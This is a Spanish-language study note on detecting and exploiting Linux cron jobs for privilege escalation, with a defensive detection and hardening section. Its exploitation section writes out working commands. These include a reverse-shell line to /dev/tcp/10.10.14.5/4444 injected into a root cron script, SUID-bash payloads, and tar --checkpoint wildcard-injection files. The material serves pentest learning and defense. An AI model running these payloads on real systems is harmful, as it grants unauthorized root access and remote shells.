---
tags:
  - ciberseguridad
  - escalada
  - deteccion-cron
tipo: concepto
estado: terminado
---

# Detección y Explotación de Tareas Cron

Una tarea **cron** es una tarea programada en sistemas Unix/Linux que se ejecuta en un momento determinado o en intervalos regulares de tiempo. Estas tareas se definen en un archivo **crontab** que especifica qué comandos deben ejecutarse y cuándo deben ejecutarse. El valor para un atacante es enorme: **cron es la fábrica de ejecuciones de root periódicas** — si el comando, el script o el directorio de trabajo de una tarea es manipulable por vos, acabás de obtener root de forma automática y repetida.

> [!info] Ubicaciones Comunes de Crontabs
> Los archivos `crontab` pueden residir en varias ubicaciones:
> - `/etc/crontab`: El crontab del sistema, que permite especificar el usuario bajo el cual se ejecutará cada tarea.
> - `/etc/cron.d/`: Directorio para scripts de cron específicos de paquetes o servicios. Cada archivo aquí es un crontab en sí mismo.
> - `/var/spool/cron/crontabs/`: Directorio que contiene los crontabs individuales de los usuarios. Cada usuario tiene su propio archivo `crontab` aquí, que puede editarse con el comando `crontab -e`.
> - `/etc/cron.hourly/`, `/etc/cron.daily/`, `/etc/cron.weekly/`, `/etc/cron.monthly/`: Directorios donde se colocan scripts que se ejecutan con la frecuencia indicada por el nombre del directorio.

## Mecánica: cómo ejecuta cron un comando

`cron` (o `cronie`/`anacron`) es un demonio que despierta cada minuto, compara el reloj con las tablas y **ejecuta cada línea como el dueño indicado, con su propio entorno**. Los detalles que deciden la explotación:

| Detalle | Semántica | Consecuencia de ataque |
|---|---|---|
| **Usuario run-as** | En `/etc/crontab` y `/etc/cron.d/*` va explícito (`root`, `www-data`); en `crontab -e` corre **como el dueño del crontab** | Solo `/etc/*` te da root; los de usuarios dan su nivel |
| **PATH mínimo** | cron corre con un PATH fijo (`/usr/bin:/bin` — a veces sin `/usr/local/bin`) | El script heredado puede llamar al "otro" `tar` → [[PATH Hijacking]] si hay directorio escribible en ese PATH |
| **Entorno aislado** | Sin variables del login shell, cwd = `$HOME` del usuario | Los scripts frágiles fallan o usan `$HOME` predecible |
| **Interpretación de shell** | La parte de comando se pasa a `/bin/sh -c` | Metacaracteres y comodines **del comando** son shell, no literales |
| **run-parts** | `/etc/cron.hourly` etc. se ejecutan vía `run-parts` desde `/etc/crontab` | Solo ejecuta ficheros sin puntos; directorio escribible = ejecución arbitraria |
| **Wildcards del comando** | `tar cf /var/backups/x.tar *` expande en cada corrida | Clásico *wildcard injection* (ver abajo) |
| **Granularidad** | minuto mínimo (salvo timers systemd) | Ventana de ~60 s para *race conditions* con `inotify` |

> [!tip] Pregunta de oro
> Ante cualquier cron: **"¿quién lo ejecuta, qué binario/script invoca, y qué de eso puedo escribir yo?"** — las tres ramas del árbol de explotación de esta nota.

### Anatomía de un crontab: los 5 (o 6) campos

`` # min hora día mes día-semana comando (en /etc/crontab y /etc/cron.d: usuario) ``
| Campo | Rango | Notas |
|---|---|---|
| minuto | 0–59 | |
| hora | 0–23 | |
| día de mes | 1–31 | |
| mes | 1–12 | |
| día de semana | 0–7 (0 y 7 = domingo) | |
| usuario | cualquier uid | **solo en `/etc/crontab` y `/etc/cron.d/`** |
| comando | camino + args | ejecutado por `sh -c` |

Ejemplos: `*/5 * * * * root /usr/local/bin/check.sh` · `0 3 * * 0 root find /var/log -name "*.gz" -delete`.

## Enumeración: localizar todas las tareas

```bash
# 1. Crontabs de todos los usuarios y del sistema
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
for f in /etc/cron.d/*; do echo "== $f"; cat "$f"; done

# 2. Crontabs de usuario (si tienes perms)
crontab -l
ls -la /var/spool/cron/crontabs/ /var/spool/cron/ 2>/dev/null
cat /var/spool/cron/crontabs/* 2>/dev/null

# 3. anacron
cat /etc/anacrontab; ls -la /var/spool/anacron/ 2>/dev/null

# 4. Timers de systemd (el cron moderno)
systemctl list-timers --all

# 5. Scripts referenciados: ¿los puedo escribir?
grep -RhoE '(/[a-z0-9._-]+)+' /etc/cron.d/* /etc/crontab 2>/dev/null | sort -u | xargs ls -la 2>/dev/null
```

Orden de triage: (a) tarea que **corre como root**; (b) script con `rwx` para mi usuario o mi grupo; (c) directorio del script escribible; (d) binario invocado por nombre relativo y con PATH/herencia manipulable; (e) comando con comodines.

## Vectores de explotación

### 1. Script de cron escribible (el más directo)

```bash
# Enumeración
find / -writable -path '*cron*' 2>/dev/null
find / -name '*.sh' -writable 2>/dev/null
# Si /opt/backup.sh corre como root cada noche y es escribible:
echo '#!/bin/bash' > /opt/backup.sh
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /opt/backup.sh
# esperar al disparo (o provocar con sudo, otra tarea, etc.)
```

### 2. Directorio `cron.*` escribible (run-parts)

```bash
# /etc/cron.hourly/pwn (si el dir es writable): run-parts lo ejecuta como root
ls -ld /etc/cron.hourly /etc/cron.daily
cat > /etc/cron.hourly/pwn <<'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF
chmod +x /etc/cron.hourly/pwn
```

> [!warning] run-parts ignora nombres con punto
> `run-parts` **no** ejecuta ficheros que contengan puntos (a propósito). El payload debe llamarse `pwn`, no `pwn.sh`.

### 3. PATH hijack del comando del crontab

Si la línea es `30 * * * * root backup.sh` (sin ruta absoluta), cron busca en **su** PATH. Si algún directorio de ese PATH es escribible por vos:

```bash
# ¿Qué PATH usa cron? Está en /etc/crontab (DEFAULT_PATH) — típicamente /usr/bin:/bin
# Si /usr/local/bin está en él y es escribible:
echo '#!/bin/bash' > /usr/local/bin/backup.sh
echo 'chmod u+s /bin/bash' >> /usr/local/bin/backup.sh
chmod +x /usr/local/bin/backup.sh
```

El detalle completo de la técnica está en [[PATH Hijacking]]; notá que **`secure_path` de sudo no aplica aquí** — este es el ataque al PATH de *cron*, distinto al de sudo.

### 4. Wildcard injection en el comando del crontab

Cron pasa el comando a `sh -c`, así que los comodines **se expanden en cada corrida con los archivos del cwd**. Si la tarea hace `tar cf /backup/x.tar *` y el cwd (o el directorio donde crea archivos intermedios) es escribible:

```bash
# tar: --checkpoint y --checkpoint-action ejecutan un binario al "avanzar"
cd /var/backups        # cwd de la tarea, o donde caiga el *
echo '#!/bin/bash' > /var/backups/shell.sh
echo 'chmod u+s /bin/bash' >> /var/backups/shell.sh
chmod +x /var/backups/shell.sh
touch /var/backups/--checkpoint=1
touch /var/backups/--checkpoint-action=exec=shell.sh
# Al correr: tar recibe ... --checkpoint=1 --checkpoint-action=exec=shell.sh * → ejecuta shell.sh como root
```

Otros binarios con payloads por argumento (catálogo estilo GTFOBins):

| Binario en cron | Payload plantado como "archivo" | Efecto |
|---|---|---|
| `tar` | `--checkpoint=1`, `--checkpoint-action=exec=X` | ejecuta `X` |
| `find` | `-exec` no aplica (es del comando), pero `find . -exec` con args de cron… | ver nota Binarios |
| `zip` | `--unzip-command="sh -c ..."` | ejecuta shell |
| `rsync` | `-e` / `--rsh='sh -c ...'` | ejecuta shell |
| `7z` | `-w` opcional | limitado |
| `chmod` | `--reference=X` / argumentos | a veces escalable |
| `cp`/`mv` | `--backup` + rutas relativas | sobrescritura |

Regla: **si el comando del cron expande `*` sobre un directorio escribible, cualquiera de estos binarios es un root shell esperando disparo**.

### 5. Race condition con `inotify` (wildcard en tiempo real)

Muchos scripts hacen `tar cf /backup/x.tar /datos/*` o escriben y renombran. La ventana entre la creación del archivo temporal y su uso permite **infectarlo** sin esperar a cron:

```bash
# Monitorizar el directorio y, al ver el archivo nuevo, colar nuestro payload
inotifywait -m -e create /var/backups/ &
# cuando aparezca el archivo, inyectar --checkpoint* (patrón del punto 4)
# el guión clásico:
while inotifywait -e create /var/backups/; do
  touch '/var/backups/--checkpoint=1'
  touch '/var/backups/--checkpoint-action=exec=sh shell.sh'
done
```

Esta es la técnica de *wildcard race* documentada en HackTricks: no modificas la tarea, modificas el **momento en que los argumentos se expanden**. Con `tar`, si además el script comprime `/var/backups/*` contra su propio directorio, basta con dejar los `--checkpoint*` **ya plantados**: los archivos "fantasma" viajan como argumentos en cada corrida (variante sin carrera — la de la sección 4).

### 6. Binario referenciado por ruta manipulable (herencia)

Si la tarea ejecuta `/opt/tool` y `/opt` es escribible → sobrescribir `tool`. Si ejecuta `python /opt/a.py` con PATH sin ruta absoluta → ver [[PATH Hijacking]] y [[Python Library Hijacking]] para `sitecustomize.py` en el `PYTHONPATH` efectivo.

## Detección de tareas en tiempo real: Pspy

Para detectar tareas cron (y cualquier proceso lanzado por root) **sin permisos de root**, se usa **Pspy**:

> [!tip] Funcionamiento de Pspy
> Pspy opera monitoreando el sistema de archivos `/proc` (procfs), que es un sistema de archivos virtual que proporciona información sobre los procesos en ejecución. Específicamente, Pspy observa los cambios en los directorios `/proc/[PID]` y los archivos dentro de ellos, como `cmdline` (línea de comandos) y `status` (estado del proceso), para identificar nuevos procesos y sus argumentos. Esto le permite detectar la ejecución de tareas cron, scripts y otros programas en tiempo real sin necesidad de permisos de root (aunque con root puede ver más detalles).

```bash
git clone https://github.com/DominicBreuker/pspy
# binarios precompilados: pspy32 / pspy64 (útil en hosts sin gcc)
./pspy64
# salida: UID=0 cmd=/bin/sh -c /opt/backup.sh   ← confirmación de root+cron
```

Alternativas: `inotifywait` sobre `/etc/crontab` y `/var/spool/cron/crontabs` (detecta **edición**), `auditctl -w /etc/cron.d -p wa` (detecta escritura), `journalctl -u cron -f`.

> [!info] Registro de Cron
> En la mayoría de los sistemas Linux, el demonio `cron` registra sus actividades a través de `syslog`. Los registros de cron suelen encontrarse en archivos como `/var/log/syslog`, `/var/log/messages`, o un archivo específico como `/var/log/cron` (dependiendo de la configuración de `rsyslog` o `syslog-ng`). Es fundamental revisar estos registros periódicamente para detectar ejecuciones anómalas o errores que puedan indicar un intento de explotación.

Artefactos forenses: entradas `CRON[pid]: (*CMD*)` en syslog, mtime de los crontabs (`stat /etc/crontab`), archivos `--checkpoint*` abandonados en directorios de backup, scripts modificados fuera de ventana de mantenimiento.

## Detección (lado defensor, resumen)

| Señal | Herramienta | Qué delata |
|---|---|---|
| Escritura en `/etc/cron.*` | auditd (`-w /etc/crontab -p wa -k cron_write`) | alguien creó/modificó una tarea |
| Ejecución de `sh -c` periódica con args raros | syslog de cron + SIEM | wildcard o binario inesperado |
| Procesos de root con `--checkpoint` | Pspy/EDR | explotación de wildcard en curso |
| Nuevo archivo en `/etc/cron.hourly` | AIDE | payload plantado |
| Carga de módulo/creación de SUID tras cron | auditd (`-w /bin/chmod`) | shell persistente |

## Impacto

- **Root automático y persistente**: cada disparo re-ejecuta el payload (ideal para reverse shell, adición de usuario, SUID, clave SSH).
- Si la tarea corre como usuario no-root → escalada a ese usuario (paso intermedio, p. ej. `www-data` para lateral a una web).
- Ejecución **oculta**: los jobs corren sin TTY; sin Pspy, la actividad es invisible en `ps` una vez terminada.

## Sección defensiva: endurecimiento

```bash
# 1. Permisos correctos
chmod 644 /etc/crontab; chown root:root /etc/crontab
ls -ld /etc/cron.d /etc/cron.hourly /etc/cron.daily    # deben ser 755 root:root
ls -la /var/spool/cron/crontabs                          # 1730 root:crontab

# 2. Revisar quién tiene crontab
grep -v '^#' /etc/crontab
for u in $(cut -f1 -d: /etc/passwd); do crontab -l -u "$u" 2>/dev/null && echo "^^ $u"; done

# 3. Rutas absolutas en TODOS los comandos de cron
#    Mal:  */10 * * * * root backup.sh
#    Bien: */10 * * * * root /usr/local/bin/backup.sh

# 4. No ejecutar desde directorios escribibles; cwd explícito con permisos root
# 5. Evitar comodines en comandos de cron — enumerar con find dentro del script
#    tar con --exclude explícito en vez de *

# 6. Logs de ejecución de cada tarea
30 2 * * * root /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1

# 7. Monitoreo
auditctl -w /etc/crontab -p wa -k cron_write
auditctl -w /etc/cron.d -p wa -k cron_d_write
journalctl -u cron --since today | grep -i error
```

> [!warning] Permisos Inseguros
> Un error común es que los scripts ejecutados por cron tengan permisos de escritura para usuarios no privilegiados. Si un script en `/usr/local/bin/script.sh` es ejecutado por `root` vía cron y un usuario de bajo privilegio tiene permisos de escritura sobre él, ese usuario podría modificar el script para ejecutar comandos arbitrarios como `root`. Se deben usar `chmod` y `chown` para asegurar que solo el propietario (idealmente `root`) y los grupos autorizados tengan permisos de escritura.

Recomendaciones operativas adicionales: **limitar el número de tareas cron** (menos superficie), **verificar permisos de archivos y directorios asociados** (evitar SUID/root donde no se necesita), **supervisar regularmente el sistema** con FIM y **habilitar registro** de cada tarea para poder reconstruir qué corrió y cuándo.

## Errores comunes

1. **Olvidar que solo `/etc/crontab` y `/etc/cron.d` llevan usuario**: en `crontab -e` la tarea corre como tú — un cron "suyo" no escala.
2. **Buscar `*.sh` pero `run-parts` ejecuta sin extensión** en `cron.hourly` (y con `.` en el nombre lo ignora).
3. **Dar por sentado el cwd**: los comodines expanden según el directorio de trabajo del cron (normalmente `$HOME` del usuario run-as), no siempre donde está el script.
4. **No distinguir cron de systemd timers**: en distros modernas muchas "crons" son timers (`.timer` + `.service`); buscar también `systemctl list-timers`.
5. **False positive**: scripts con `chmod 775 root:staff` parecen "writable" en `find -perm -0002`… no — 775 no es world-writable; verificar siempre con `test -w`.
6. **Esperar minutos sin mirar**: si tienes acceso a ejecutar algo como root (sudo acotado), dispara la tarea o el binario en vez de esperar la ventana.

## Cheatsheet

```bash
# Enumeración
cat /etc/crontab; ls -la /etc/cron.*; ls -la /var/spool/cron/crontabs
systemctl list-timers --all
grep -R . /etc/cron.d/ ; cat /etc/anacrontab
find / -writable -path '*cron*' 2>/dev/null

# Wildcard tar
echo '#!/bin/bash\nchmod u+s /bin/bash' > DIR/shell.sh && chmod +x DIR/shell.sh
touch 'DIR/--checkpoint=1' 'DIR/--checkpoint-action=exec=shell.sh'

# Detección en vivo
./pspy64
inotifywait -m -e create,modify /etc/crontab /var/spool/cron/crontabs
auditctl -w /etc/crontab -p wa -k cron_write

# Hardening
chmod 644 /etc/crontab; chown root:root /etc/crontab /etc/cron.d/*
# rutas absolutas en todos los comandos, sin comodines, log de cada tarea
```

## Referencias

- HackTricks — Privilege escalation by cron job injection: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/privilege-escalation-by-cron-job-injection.html
- Pspy: https://github.com/DominicBreuker/pspy
- GTFOBins (`tar`, `find`, `zip`…): https://gtfobins.github.io/
- crontab(5) man page: https://man7.org/linux/man-pages/man5/crontab.5.html
- Notas internas: [[Cron Jobs y Programación de Tareas]], [[PATH Hijacking]], [[Abuso de Permisos en Linux y LSE]], [[Bash Scripting - Fundamentos Básicos]]

## Relacionadas

- [[Cron Jobs y Programación de Tareas]] — referencia de sintaxis y programación
- [[PATH Hijacking]] — segundo salto desde el PATH de cron
- [[Elevación de Privilegios mediante Explotación de Binarios]] — si el cron ejecuta un binario con bug
- [[Abuso de Privilegios Sudoers]] — cron + regla sudo acotada
- [[Abuso de Permisos en Linux y LSE]] — lugar de esta técnica en la enumeración
